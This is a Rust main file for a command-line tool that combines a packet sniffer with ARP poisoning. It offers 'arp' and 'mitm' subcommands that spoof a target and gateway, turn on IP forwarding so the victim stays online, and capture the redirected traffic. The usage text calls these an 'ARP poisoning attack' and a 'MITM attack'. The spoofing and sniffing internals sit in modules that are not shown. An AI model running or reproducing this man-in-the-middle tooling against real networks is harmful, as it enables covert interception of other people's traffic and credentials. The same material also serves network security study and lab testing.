mod sniffing;
mod ltm;

use sniffing::arp_spoofing::ArpSpoofer;
use sniffing::packet_sniffing::{start_sniffer, SnifferConfig};
use pcap::Device;
use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

fn main() {
    let args: Vec<String> = std::env::args().collect();

    println!("╔════════════════════════════════════════╗");
    println!("║   Network Security Tool v1.0           ║");
    println!("║   Sniffer + ARP Poisoning              ║");
    println!("╚════════════════════════════════════════╝\n");

    if args.len() < 2 {
        print_usage();
        return;
    }

    match args[1].as_str() {
        "sniff" => {
            let config = parse_sniffer_args(&args[2..], false, "", "");
            start_sniffer(config);
        }
        "arp" => {
            if args.len() != 5 {
                println!("[!] Usage: sudo cargo run -- arp <interface> <target_ip> <gateway_ip>");
                return;
            }
            let interface = args[2].clone();
            let target_ip: Ipv4Addr = args[3].parse().expect("Invalid target IP");
            let gateway_ip: Ipv4Addr = args[4].parse().expect("Invalid gateway IP");

            let mut spoofer = ArpSpoofer::new(&interface, target_ip, gateway_ip)
                .expect("Failed to create ARP spoofer");
            spoofer.discover().expect("Failed to discover MAC addresses");

            // Wrap in Arc<Mutex> so the Ctrl+C handler can call restore() before exit,
            // since std::process::exit() bypasses Drop.
            let spoofer = Arc::new(Mutex::new(spoofer));
            let spoofer_ctrlc = Arc::clone(&spoofer);

            ctrlc::set_handler(move || {
                println!("\n[!] Ctrl+C detected! Restoring ARP tables...");
                if let Ok(s) = spoofer_ctrlc.lock() {
                    let _ = s.restore();
                }
                std::process::exit(0);
            })
            .expect("Error setting Ctrl-C handler");

            spoofer
                .lock()
                .unwrap()
                .start_poisoning()
                .expect("ARP poisoning failed");
        }
        "mitm" => {
            if args.len() < 4 {
                println!("[!] Usage: sudo cargo run -- mitm <target_ip> <gateway_ip> [interface]");
                return;
            }
            let target_ip = args[2].clone();
            let gateway_ip = args[3].clone();
            // Fix: no longer hardcoded to "en0"; defaults to en0 if not supplied.
            let interface = args.get(4).cloned().unwrap_or_else(|| "en0".to_string());

            let target_parsed: Ipv4Addr = target_ip.parse().expect("Invalid target IP");
            let gateway_parsed: Ipv4Addr = gateway_ip.parse().expect("Invalid gateway IP");

            // Enable IP forwarding so captured packets are actually forwarded
            // and the victim does not lose connectivity.
            #[cfg(target_os = "linux")]
            {
                match std::fs::write("/proc/sys/net/ipv4/ip_forward", "1") {
                    Ok(_) => println!("[+] IP forwarding enabled"),
                    Err(e) => eprintln!("[!] Warning: could not enable IP forwarding ({}). Run as root.", e),
                }
            }

            println!("[*] Starting MITM attack on interface {}...", interface);

            let iface_clone = interface.clone();
            thread::spawn(move || {
                let mut spoofer = ArpSpoofer::new(&iface_clone, target_parsed, gateway_parsed)
                    .expect("Failed to create ARP spoofer");
                spoofer.discover().expect("Failed to discover MAC addresses");
                spoofer.start_poisoning().ok();
            });

            thread::sleep(Duration::from_secs(3));

            let config = parse_sniffer_args(&args[5..], true, &target_ip, &gateway_ip);
            start_sniffer(config);
        }
        "devices" => {
            list_devices();
        }
        _ => {
            println!("[!] Unknown command: {}", args[1]);
            print_usage();
        }
    }
}

/// Build a SnifferConfig from a slice of extra args (everything after the sub-command).
/// Base values for enable_spoofing / target_ip / gateway_ip are injected by the caller.
fn parse_sniffer_args(
    extra: &[String],
    enable_spoofing: bool,
    target_ip: &str,
    gateway_ip: &str,
) -> SnifferConfig {
    let mut config = SnifferConfig {
        device: "en0".to_string(),
        verbose: false,
        visualize: false,
        print_devices: false,
        enable_spoofing,
        target_ip: target_ip.to_string(),
        gateway_ip: gateway_ip.to_string(),
    };

    let mut i = 0;
    while i < extra.len() {
        match extra[i].as_str() {
            "--visualize" | "-V" | "--viz" => config.visualize = true,
            "--verbose" | "-v" => config.verbose = true,
            "--print" | "-p" | "--print_devices" => config.print_devices = true,
            "--device" | "-d" => {
                if i + 1 < extra.len() {
                    config.device = extra[i + 1].clone();
                    i += 1;
                }
            }
            _ => {}
        }
        i += 1;
    }
    config
}

fn list_devices() {
    match Device::list() {
        Ok(devices) => {
            println!("\nAvailable network devices:");
            for dev in devices {
                println!("  {} - {:?}", dev.name, dev.desc.unwrap_or_default());
            }
        }
        Err(e) => {
            println!("[!] Failed to list devices: {}", e);
        }
    }
}

fn print_usage() {
    println!("Usage:");
    println!("  sudo cargo run -- sniff                               # Start packet sniffer");
    println!("  sudo cargo run -- sniff -V                            # Sniffer with live visualization");
    println!("  sudo cargo run -- sniff -v                            # Verbose per-packet output");
    println!("  sudo cargo run -- sniff -d <dev>                      # Use specific device");
    println!("  sudo cargo run -- arp <iface> <target> <gw>           # ARP poisoning attack");
    println!("  sudo cargo run -- mitm <target> <gw> [iface]          # MITM attack (ARP + sniff)");
    println!("  cargo run -- devices                                   # List network devices");
    println!("\nSniffer Options (with 'sniff' or 'mitm' command):");
    println!("  -V, --visualize    Live visualization with bandwidth & packet rate");
    println!("  -v, --verbose      Verbose per-packet output");
    println!("  -d, --device <dev> Use specific network device (default: en0)");
    println!("  -p, --print        Print available devices");
}